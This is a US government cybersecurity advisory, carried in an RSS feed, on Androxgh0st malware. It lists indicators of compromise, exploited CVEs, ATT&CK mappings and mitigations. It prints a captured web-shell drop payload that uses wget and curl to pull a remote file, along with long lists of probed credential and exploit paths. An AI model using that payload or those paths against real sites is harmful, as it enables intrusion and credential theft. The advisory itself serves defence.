{"?xml":{"@version":"1.0","@encoding":"utf-8"},"rss":{"@version":"2.0","@xml:base":"https://www.cisa.gov/","@xmlns:dc":"http://purl.org/dc/elements/1.1/","channel":{"title":"CISA Cybersecurity Advisories","link":"https://www.cisa.gov/","description":"","language":"en","item":[{"title":"Known Indicators of Compromise Associated with Androxgh0st Malware","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a","description":"<h3><strong>SUMMARY</strong></h3>\n<p>The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with threat actors deploying Androxgh0st malware. Multiple, ongoing investigations and trusted third party reporting yielded the IOCs and TTPs, and provided information on Androxgh0st malware’s ability to establish a botnet that can further identify and compromise vulnerable networks.</p>\n<p>The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by Androxgh0st infections.</p>\n<p>Download the PDF version of this report:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2024-01/aa24-016a-known-indicators-of-compromise-associated-with-adroxgh0st-malware_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware</a>\n    <span class=\"c-file__size\">(PDF,       576.40 KB\n  )</span>\n  </div>\n</div>\n<p>For a downloadable copy of IOCs, see:</p>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2024-01/AA24-016A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-016A STIX XML</a>\n    <span class=\"c-file__size\">(XML,       45.81 KB\n  )</span>\n  </div>\n</div>\n\n\n\n\n\n<div class=\"c-file\">\n    <div class=\"c-file__download\">\n    <a href=\"/sites/default/files/2024-01/AA24-016A-known-indicators-of-compromise-associated-with-adroxgh0st-malware.stix__0.json\" class=\"c-file__link\" target=\"_blank\">AA24-016A STIX JSON</a>\n    <span class=\"c-file__size\">(JSON,       39.87 KB\n  )</span>\n  </div>\n</div>\n<h3><strong>TECHNICAL DETAILS</strong></h3>\n<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> for Enterprise</a> framework, version 14. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>\n<h4><strong>Overview</strong></h4>\n<p>Androxgh0st malware has been observed establishing a botnet [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/005/\" title=\"Acquire Infrastructure: Botnet\">T1583.005</a>] for victim identification and exploitation in target networks. According to open source reporting[<a href=\"https://fortiguard.fortinet.com/threat-signal-report/5066/androxgh0st-malware-actively-used-in-the-wild\" title=\"AndroxGh0st Malware Actively Used in the Wild\">1</a>], Androxgh0st is a Python-scripted malware [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/006/\" title=\"Command and Scripting Interpreter: Python\">T1059.006</a>] primarily used to target .env files that contain confidential information, such as credentials [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials In Files\">T1552.001</a>] for various high profile applications (i.e., Amazon Web Services [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>] and exploiting exposed credentials [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>] and application programming interfaces (APIs) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/\" title=\"Email Collection\">T1114</a>], and web shell deployment [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>].</p>\n<h4><strong>Targeting the PHPUnit</strong></h4>\n<p>Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1595/\" title=\"Active Scanning\">T1595</a>] and searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st have been observed exploiting <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-9841\" title=\"CVE-2017-9841\">CVE-2017-9841</a> to remotely run hypertext preprocessor (PHP) code on fallible websites via PHPUnit [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]. Websites using the PHPUnit module that have internet-accessible (exposed) <code>/vendor</code> folders are subject to malicious <code>HTTP POST</code> requests to the <code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code> uniform resource identifier (URI). This PHP page runs PHP code submitted through a POST request, which allows the threat actors to remotely execute code.</p>\n<p>Malicious actors likely use Androxgh0st to download malicious files [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>] to the system hosting the website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to provide backdoor access to the website. This allows threat actors to download additional malicious files for their operations and access databases.</p>\n<h4><strong>Laravel Framework Targeting</strong></h4>\n<p>Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework. After identifying websites using the Laravel web application, threat actors attempt to determine if the domain’s root-level <code>.env</code> file is exposed and contains credentials for accessing additional services. <strong>Note:</strong> <code>.env</code> files commonly store credentials and tokens. Threat actors often target <code>.env</code> files to steal these credentials within the environment variables.</p>\n<p>If the <code>.env</code> file is exposed, threat actors will issue a GET request to the <code>/.env</code> URI to attempt to access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named <code>0x[]</code> containing certain data sent to the web server. This data is frequently used as an identifier for the threat actor. This method appears to be used for websites in debug mode (i.e., when non-production websites are exposed to the internet). A successful response from either of these methods allows the threat actors to look for usernames, passwords, and/or other credentials pertaining to services such as email (via SMTP) and AWS accounts.</p>\n<p>Androxgh0st malware can also access the application key [<a href=\"https://attack.mitre.org/versions/v14/tactics/TA0006/\" title=\"Credential Access\">TA0006</a>] for the Laravel application on the website. If the threat actors successfully identify the Laravel application key, they will attempt exploitation by using the key to encrypt PHP code [<a href=\"https://attack.mitre.org/versions/v13/techniques/T1027/010/\" title=\"Obfuscated Files or Information: Command Obfuscation\">T1027.010</a>]. The encrypted code is then passed to the website as a value in the cross-site forgery request (XSRF) token cookie, <code>XSRF-TOKEN</code>, and included in a future GET request to the website. The vulnerability defined in <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-15133\" title=\"CVE-2018-15133\">CVE-2018-15133</a> indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which can allow for remote code execution. In doing so, the threat actors can upload files to the website via remote access.</p>\n<h4><strong>Apache Web Server Targeting</strong></h4>\n<p>In correlation with <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41773\" title=\"CVE-2021-41773\">CVE-2021-41773</a>, Androxgh0st<em> </em>actors have been observed scanning vulnerable web servers [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1595/002/\" title=\"Active Scanning: Vulnerability Scanning\">T1595.002</a>] running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can identify uniform resource locators (URLs) for files outside root directory through a path traversal attack [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a>]. If these files are not protected by the “request all denied” configuration and Common Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution.</p>\n<p>If threat actors obtain credentials for any services using the above methods, they may use these credentials to access sensitive data or use these services to conduct additional malicious operations. For example, when threat actors successfully identify and compromise AWS credentials from a vulnerable website, they have been observed attempting to create new users and user policies [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/\" title=\"Create Account\">T1136</a>]. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for conducting additional scanning activity [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/006/\" title=\"Acquire Infrastructure: Web Services\">T1583.006</a>].</p>\n<h3><strong>INDICATORS OF COMPROMISE (IOCs)</strong></h3>\n<p>Based on investigations and analysis, the following requests are associated with Androxgh0st activity:</p>\n<ul><li>Incoming GET and POST requests to the following URIs:\n<ul><li><code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/.env</code></li>\n</ul></li>\n<li>Incoming POST requests with the following strings:\n<ul><li><code>[0x%5B%5D=androxgh0st]</code></li>\n<li><code>ImmutableMultiDict([('0x[]', 'androxgh0st')])</code></li>\n</ul></li>\n</ul><p>In both previously listed POST request strings, the name <code>androxgh0st</code> has been observed to be replaced with other monikers.</p>\n<p>Additional URIs observed by the FBI and a trusted third party used by these threat actors for credential exfiltration include:</p>\n<ul><li><code>/info</code></li>\n<li><code>/phpinfo</code></li>\n<li><code>/phpinfo.php</code></li>\n<li><code>/?phpinfo=1</code></li>\n<li><code>/frontend_dev.php/$</code></li>\n<li><code>/_profiler/phpinfo</code></li>\n<li><code>/debug/default/view?panel=config</code></li>\n<li><code>/config.json</code></li>\n<li><code>/.json</code></li>\n<li><code>/.git/config</code></li>\n<li><code>/live_env</code></li>\n<li><code>/.env.dist</code></li>\n<li><code>/.env.save</code></li>\n<li><code>/environments/.env.production</code></li>\n<li><code>/.env.production.local</code></li>\n<li><code>/.env.project</code></li>\n<li><code>/.env.development</code></li>\n<li><code>/.env.production</code></li>\n<li><code>/.env.prod</code></li>\n<li><code>/.env.development.local</code></li>\n<li><code>/.env.old</code></li>\n<li><code>/&lt;insert-directory&gt;/.env </code>\n<ul><li><strong>Note: </strong>the actor may attempt multiple different potential URI endpoints scanning for the <code>.env</code> file, for example <code>/docker/.env or /local/.env</code>.</li>\n</ul></li>\n<li><code>/.aws/credentials</code></li>\n<li><code>/aws/credentials</code></li>\n<li><code>/.aws/config</code></li>\n<li><code>/.git</code></li>\n<li><code>/.test</code></li>\n<li><code>/admin</code></li>\n<li><code>/backend</code></li>\n<li><code>/app</code></li>\n<li><code>/current</code></li>\n<li><code>/demo</code></li>\n<li><code>/api</code></li>\n<li><code>/backup</code></li>\n<li><code>/beta</code></li>\n<li><code>/cron</code></li>\n<li><code>/develop</code></li>\n<li><code>/Laravel</code></li>\n<li><code>/laravel/core</code></li>\n<li><code>/gists/cache</code></li>\n<li><code>/test.php</code></li>\n<li><code>/info.php</code></li>\n<li><code>//.env</code></li>\n<li><code>/admin-app/.env%20</code></li>\n<li><code>/laravel/.env%20</code></li>\n<li><code>/shared/.env%20</code></li>\n<li><code>/.env.project%20</code></li>\n<li><code>/apps/.env%20</code></li>\n<li><code>/development/.env%20</code></li>\n<li><code>/live_env%20</code></li>\n<li><code>/.env.development%20</code></li>\n</ul><h5><strong>Targeted URIs for web-shell drop:</strong></h5>\n<ul><li><code>/.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//lib/phpunit/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>//lib/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//lib/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>//new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//phpunit/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>//phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>//protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstdin.php</code></li>\n<li><code>//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//vendor/phpunit/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>//vendor/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//vendor/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>//wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>//www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php</code></li>\n<li><code>/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/lib/phpunit/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>/lib/phpunit/phpunit/Util/PHP/eval</code></li>\n<li><code>stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/lib/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/lib/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/phpunit/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>/phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/evalstdin.php</code></li>\n<li><code>/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>./phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev</code></li>\n<li><code>/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/vendor/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/vendor/phpunit/Util/PHP/eval-stdin.php</code></li>\n<li><code>/vendor/phpunit/Util/PHP/eval-stdin.php%20</code></li>\n<li><code>/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n<li><code>/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>\n</ul><h5><strong>An example of attempted credential exfiltration through (honeypot) open proxies:</strong></h5>\n<p><code>POST /.aws/credentials HTTP/1.1<br />\nhost: www.example.com<br />\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36<br />\naccept-encoding: gzip, deflate<br />\naccept: */*<br />\nconnection: keep-alive<br />\ncontent-length: 20<br />\ncontent-type: application/x-www-form-urlencoded</code></p>\n<p>0x%5B%5D=androxgh0st</p>\n<h5><strong>An example of attempted web-shell drop through (honeypot) open proxies:</strong></h5>\n<p><code>GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1<br />\nhost: www.example.com<br />\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76<br />\naccept-encoding: gzip, deflate<br />\naccept: */*<br />\nconnection: keep-alive<br />\nx-forwarded-for: 200.172.238.135<br />\ncontent-length: 279</code></p>\n<p>&lt;?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?&gt;</p>\n<h5><strong>Monikers used instead of Androxgh0st (0x%5B%5D=???):</strong></h5>\n<ul><li>Ridho</li>\n<li>Aws</li>\n<li>0x_0x</li>\n<li>x_X</li>\n<li>nopebee7</li>\n<li>SMTPEX</li>\n<li>evileyes0</li>\n<li>privangga</li>\n<li>drcrypter</li>\n<li>errorcool</li>\n<li>drosteam</li>\n<li>androxmen</li>\n<li>crack3rz</li>\n<li>b4bbyghost</li>\n<li>0x0day</li>\n<li>janc0xsec</li>\n<li>blackb0x</li>\n<li>0x1331day</li>\n<li>Graber</li>\n</ul><h5><strong>Example malware drops through eval-stdin.php:</strong></h5>\n<p><code>hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt<br />\n59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4</code></p>\n<p>hxxps://chainventures.co[.]uk/.well-known/aas<br />\ndcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6</p>\n<p>hxxp://download.asyncfox[.]xyz/download/xmrig.x86_64<br />\n23fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066</p>\n<p>hxxps://pastebin[.]com/raw/zw0gAmpC<br />\nca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72</p>\n<p>hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php<br />\n0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317ef</p>\n<p>hxxp://45.95.147[.]236/tmp.x86_64<br />\n6b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbc</p>\n<p>hxxp://main.dsn[.]ovh/dns/pwer<br />\nbb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7</p>\n<p>hxxp://tangible-drink.surge[.]sh/configx.txt<br />\nde1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba</p>\n<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>\n<p>See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 1: Reconnaissance</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Active Scanning: Vulnerability Scanning</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1595/002/\" title=\"Active Scanning: Vulnerability Scanning\">T1595.002</a></p>\n</td>\n<td>\n<p>The threat actor scans websites for specific vulnerabilities to exploit.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 2: Resource Development</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Acquire Infrastructure: Botnet</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/005/\" title=\"Acquire Infrastructure: Botnet\">T1583.005</a></p>\n</td>\n<td>\n<p>The threat actor establishes a botnet to identify and exploit victims.</p>\n</td>\n</tr><tr><td>\n<p>Acquire Infrastructure: Web Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/006/\" title=\"Acquire Infrastructure: Web Services\">T1583.006</a></p>\n</td>\n<td>\n<p>The threat actor creates new AWS instances to use for scanning.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 3: Initial Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Exploit Public-Facing Application</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></p>\n</td>\n<td>\n<p>The threat actor exploits <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-9841\">CVE-2017-9841</a> to remotely run hypertext preprocessor (PHP) code on websites via PHPUnit.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 4: Execution</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Command and Scripting Interpreter: Python</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1059/006/\" title=\"Command and Scripting Interpreter: Python\">T1059.006</a></p>\n</td>\n<td>\n<p>The threat actor uses Androxgh0st, a Python-scripted malware, to target victim files.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: Persistence</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>ID</strong></th>\n<th scope=\"col\" role=\"columnheader\"><strong>Use</strong></th>\n</tr></thead><tbody><tr><td>\n<p>Valid Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>\n</td>\n<td>\n<p>The threat actor abuses the simple mail transfer protocol (SMTP) by exploiting exposed credentials.</p>\n</td>\n</tr><tr><td>\n<p>Server Software Component: Web Shell</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></p>\n</td>\n<td>\n<p>The threat actor deploys web shells to maintain persistent access to systems.</p>\n</td>\n</tr><tr><td>\n<p>Create Account</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/\" title=\"Create Account\">T1136</a></p>\n</td>\n<td>\n<p>The threat actor attempts to create new users and user policies with compromised AWS credentials from a vulnerable website.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: Defense Evasion</em></caption>\n<thead><tr><td><strong>Technique Title</strong></td>\n<td><strong>ID</strong></td>\n<td><strong>Use</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Obfuscated Files or Information: Command Obfuscation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1027/010/\" title=\"Obfuscated Files or Information: Command Obfuscation\">T1027.010</a></p>\n</td>\n<td>\n<p>The threat actor can exploit a successfully identified Laravel application key to encrypt PHP code, which is then passed to the site as a value in the XSRF-TOKEN cookie.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: Credential Access</em></caption>\n<thead><tr><td><strong>Technique Title</strong></td>\n<td><strong>ID</strong></td>\n<td><strong>Use</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Credential Access</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v13/tactics/TA0006/\" title=\"Credential Access\">TA0006</a></p>\n</td>\n<td>\n<p>The threat actor can access the application key of the Laravel application on the site.</p>\n</td>\n</tr><tr><td>\n<p>Unsecured Credentials: Credentials in Files</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials in Files\">T1552.001</a></p>\n</td>\n<td>\n<p>The threat actor targets .env files that contain confidential credential information.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 8: Discovery</em></caption>\n<thead><tr><td><strong>Technique Title</strong></td>\n<td><strong>ID</strong></td>\n<td><strong>Use</strong></td>\n</tr></thead><tbody><tr><td>\n<p>File and Directory Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v13/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a></p>\n</td>\n<td>\n<p>The threat actor can identify URLs for files outside root directory through a path traversal attack.</p>\n</td>\n</tr><tr><td>\n<p>Network Service Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></p>\n</td>\n<td>\n<p>The threat actor uses Androxgh0st to abuse simple mail transfer protocol (SMTP) via scanning.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 9: Collection</em></caption>\n<thead><tr><td><strong>Technique Title</strong></td>\n<td><strong>ID</strong></td>\n<td><strong>Use</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Email Collection</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/\" title=\"Email Collection\">T1114</a></p>\n</td>\n<td>\n<p>The threat actor interacts with application programming interfaces (APIs) to gather information.</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 10: Command and Control</em></caption>\n<thead><tr><td><strong>Technique Title</strong></td>\n<td><strong>ID</strong></td>\n<td><strong>Use</strong></td>\n</tr></thead><tbody><tr><td>\n<p>Ingress Tool Transfer</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></p>\n</td>\n<td>\n<p>The threat actor runs PHP code through a POST request to download malicious files to the system hosting the website.</p>\n</td>\n</tr></tbody></table><h3><strong>MITIGATIONS</strong></h3>\n<p>The FBI and CISA recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and 